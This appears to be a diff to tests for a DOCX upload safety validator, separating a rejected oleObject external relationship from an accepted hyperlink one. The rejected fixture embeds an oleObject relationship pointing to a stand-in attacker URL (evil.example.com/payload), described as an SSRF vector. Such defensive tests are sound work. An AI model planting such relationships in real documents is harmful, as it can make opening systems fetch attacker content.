@@ -18,12 +18,26 @@ async function makeZip(
   return zip.generateAsync({ type: 'nodebuffer' });
 }
 
-const EXTERNAL_RELS_XML = [
+// oleObject triggers automatic server-side fetching when Word opens the document — SSRF vector.
+const DANGEROUS_EXTERNAL_RELS_XML = [
+  '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
+  '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">',
+  '  <Relationship Id="rId1"',
+  '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"',
+  '    Target="http://evil.example.com/payload"',
+  '    TargetMode="External"/>',
+  '</Relationships>',
+].join('\n');
+
+// Hyperlinks are passive (user must click) — they are allowed in external rels.
+// All 28 ARCAT/CPI fixture files contain hyperlink external rels; blocking them
+// would reject every real-world spec DOCX that uses arcat.com or chatsworth.com links.
+const HYPERLINK_EXTERNAL_RELS_XML = [
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
   '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">',
   '  <Relationship Id="rId1"',
   '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"',
-  '    Target="http://evil.example.com/payload"',
+  '    Target="https://www.arcat.com/sd/display_hidden_notes.shtml"',
   '    TargetMode="External"/>',
   '</Relationships>',
 ].join('\n');
@@ -92,9 +106,14 @@ describe('assertDocxSafe — bomb and relationship rejection', () => {
     await expect(assertDocxSafe(buf)).rejects.toThrow('compression ratio');
   });
 
-  it('rejects zip with external relationship (TargetMode="External")', async () => {
-    const buf = await makeZip({ 'word/_rels/document.xml.rels': EXTERNAL_RELS_XML });
+  it('rejects zip with dangerous external relationship (oleObject — SSRF vector)', async () => {
+    const buf = await makeZip({ 'word/_rels/document.xml.rels': DANGEROUS_EXTERNAL_RELS_XML });
     await expect(assertDocxSafe(buf)).rejects.toThrow('external relationship');
+  });
+
+  it('accepts zip with hyperlink external relationship (passive — not an SSRF vector)', async () => {
+    const buf = await makeZip({ 'word/_rels/document.xml.rels': HYPERLINK_EXTERNAL_RELS_XML });
+    await expect(assertDocxSafe(buf)).resolves.toBeUndefined();
   });
 
   it('rejects zip with more than 200 entries', async () => {
